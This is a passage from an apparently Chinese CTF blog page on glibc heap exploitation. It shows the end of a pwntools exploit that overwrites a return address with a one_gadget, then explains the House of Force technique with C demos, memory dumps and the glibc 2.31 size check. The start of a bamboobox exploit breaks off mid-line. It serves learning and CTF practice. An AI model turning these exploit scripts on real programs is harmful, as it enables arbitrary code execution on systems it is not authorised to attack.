&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">4</span>)</span><br><span class="line">	tinypad=<span class="number">0x602040</span></span><br><span class="line">	prev_size=heap_addr-<span class="number">0x602040</span></span><br><span class="line">	environ=libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">	one_gadget=libc.address+<span class="number">0x45226</span></span><br><span class="line">	add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">	add(<span class="number">0x100</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x11</span>))<span class="comment">#!!!</span></span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">0x18</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>+p64(prev_size))</span><br><span class="line">	fakechunk=<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(tinypad+<span class="number">0x20</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>)<span class="comment">#!!!</span></span><br><span class="line">	edit(<span class="number">3</span>,fakechunk)</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	<span class="comment">#p.recv()</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(environ))</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	edit(<span class="number">4</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>+<span class="number">0x58</span>)*<span class="number">2</span>)</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	<span class="built_in">print</span>(p.recv())<span class="comment">#too much,可以接收太多遗留信息了,以后函数尽量使用sendlineafter编写</span></span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	<span class="comment">#p.recvall()</span></span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	add(<span class="number">0xf0</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xd0</span>+p64(<span class="number">666</span>)+p64(environ)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x602148</span>))</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;INDEX: 1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">	main_ret=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">240</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(main_ret))</span><br><span class="line">	edit(<span class="number">2</span>,p64(main_ret))</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	edit(<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">	quit()</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	exp()</span><br></pre></td></tr></table></figure>
<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h1><h2 id="概要-1"><a href="#概要-1" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House Of Force 是一种堆利用方法,主要通过修改top_chunk的size足够大使得申请出一个偏移大小的chunk后,top_chunk更新到指向目标地址,当再次申请chunk时得到一个包含目标地址的chunk</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
<li>能够自由地控制堆分配尺寸的大小</li>
</ol>
<p><strong>利用效果:</strong>得到一个几乎可以指向任何位置的chunk</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理,进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>
<p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。</p>
<p>glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是前面说的需要一个能够控制 top chunk size 域的漏洞。</p>
<p>一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成<strong>无符号数</strong>，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证</p>
<p>之后会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。</p>
<p>与此同时，我们需要注意的是，topchunk 的 size 也会更新</p>
<p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p>
<h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3><p><strong>篡改 <code>malloc@got.plt</code> 实现劫持程序流程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    long *ptr,*ptr2;</span><br><span class="line">    ptr=malloc(0x10);</span><br><span class="line">    ptr=(long *)(((long)ptr)+24);</span><br><span class="line">    *ptr=-1;        // &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span><br><span class="line">    malloc(-4120);  // &lt;=== 减小top chunk指针</span><br><span class="line">    malloc(0x10);   // &lt;=== 分配块实现任意地址写</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先，我们分配一个 0x10 字节大小的块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== ptr</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>之后把 top chunk 的 size 改为 0xffffffffffffffff，在真正的题目中，这一步可以通过堆溢出等漏洞来实现。 因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== ptr</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0xffffffffffffffff &lt;=== top chunk size域被更改</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>注意此时的 top chunk 位置，当我们进行下一次分配的时候就会更改 top chunk 的位置到我们想要的地方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000602020 &lt;=== top chunk此时一切正常</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>
<p>接下来我们执行<code>malloc(-4120);</code>，-4120 是怎么得出的呢？ 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code>malloc@got.plt</code> 的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x601020:   0x00007ffff7a91130 &lt;=== malloc@got.plt</span><br></pre></td></tr></table></figure>
<p>所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p>
<p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下</p>
<p><code>0x601010-0x602020=-4112</code></p>
<p>因此，我们当调用<code>malloc(-4120)</code>之后，我们可以观察到 top chunk 被抬高到我们想要的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:\   0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000601010 &lt;=== 可以观察到top chunk被抬高</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>
<p>之后分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p>
<p>但是需要注意的是，在被抬高的同时，<strong>malloc@got 附近的内容也会被修改。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_head(victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br></pre></td></tr></table></figure>
<h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h3><p>在上一个示例中，演示了通过 HOF 使得 top chunk 的指针减小来修改位于其上面 (低地址) 的 got 表中的内容， 但是 HOF 其实也可以使得 top chunk 指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    long *ptr,*ptr2;</span><br><span class="line">    ptr=malloc(0x10);</span><br><span class="line">    ptr=(long *)(((long)ptr)+24);</span><br><span class="line">    *ptr=-1;                 &lt;=== 修改top chunk size</span><br><span class="line">    malloc(140737345551056); &lt;=== 增大top chunk指针</span><br><span class="line">    malloc(0x10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到程序代码与简单示例 1 基本相同，除了第二次 malloc 的 size 有所不同。 这次我们的目标是 malloc_hook，我们知道 malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br></pre></td></tr></table></figure>
<p>可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我们需要通过 HOF 扩大 top chunk 指针的值来实现对 malloc_hook 的写。 首先，由调试得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 ，采取计算</p>
<p><code>0x7ffff7dd1b00-0x602020-0x10=140737345551056</code> 经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x00007ffff7dd1b00 &lt;=== top chunk</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>
<p>之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = 0x00007ffff7dd1b10</span><br><span class="line"></span><br><span class="line">0x400562 &lt;main+60&gt;        mov    edi, 0x10</span><br><span class="line">0x400567 &lt;main+65&gt;        call   0x400410 &lt;malloc@plt&gt;</span><br></pre></td></tr></table></figure>
<h2 id="2-31新限制"><a href="#2-31新限制" class="headerlink" title="2.31新限制"></a>2.31新限制</h2><p>主要是对申请大小也有限制</p>
<p><strong>2.31以前:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure>
<ol>
<li>需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于等于 -2 * MINSIZE(32位0x10,64位0x20)，这个一般情况下都是可以满足的。</li>
<li>需要使得 <code>request2size</code>正好转换为目标地址对应偏移的大小,注意负数与无符号数的对应</li>
</ol>
<p>这里需要注意的一个点是,虽然代码中request2size在REQUEST_OUT_OF_RANGE的后面,但是实际上运行中比较<code>((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</code>时,其实已经执行了request2size,也就是req已经是最终需要申请的大小</p>
<p><strong>2.31及以后:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">checked_request2size</span> <span class="params">(<span class="type">size_t</span> req, <span class="type">size_t</span> *sz)</span> __<span class="title function_">nonnull</span> <span class="params">(<span class="number">1</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (req &gt; PTRDIFF_MAX))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  *sz = request2size (req);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRDIFF_MAX INT64_MAX</span></span><br><span class="line">Expands to:</span><br><span class="line"><span class="number">0x7FFFFFFFFFFFFFFF</span><span class="comment">//有符号下最大的正整数</span></span><br></pre></td></tr></table></figure>
<p>对申请大小的检测多了一道,需要不大于有符号下最大的正整数</p>
<p>也就是说不能申请一个负数了,该攻击手法不能向低地址申请任意chunk了</p>
<h2 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h2><p><strong>bamboobox</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bbb&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>程序有一个magic后门</p>
<p>程序虽然没有pie,但是堆基址依然会随机化,虽然可以泄露,并以此修改got表虽然可以做,但会更麻烦一点</p>
<p>程序在开始申请了一个chunk专门用于存放两个函数指针,分别是进入程序和退出程序时的提示信息</p>
<p>而且程序在edit时,输入大小是自己任意指定的</p>
<p>所以利用house of force</p>
<p>分配chunk到第一个chunk中并修改函数指针,并退出</p>
<p>即可触发magic</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf_path=<span class="string">&#x27;./bbb&#x27;</span></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line">p=process(elf_path)</span><br><span class="line"></span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,tbs(choice))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;item name:&#x27;</span>,tbs(size))</span><br><span class="line">	sa(<span class="string">b&#x27;item:&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="built_in">str</span>(idx).encode()+<span class="string">b&#x27; : &#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;index of item:&#x27;</span>,tbs(idx))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;of item:&#x27;</span>,tbs(idx))</span><br><span class="line">	sla(<span class="string">b&#x27;item name:&#x27;</span>,tbs(size))</span><br><span class="line">	sa(<span class="string">b&#x27;the item:&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">	magic=<span class="number">0x400d49</span></span><br><span class="line">	add(<span class="number">0x20</span>, <span class="string">b&quot;d&quot;</span>) </span><br><span class="line">	payload = <span class="number">0x28</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">	edit(<span class="number">0</span>, <span class="number">0x41</span>, payload)</span><br><span class="line">	offset=-<span class="number">0x30</span>-<span class="number">0x20</span>-<span 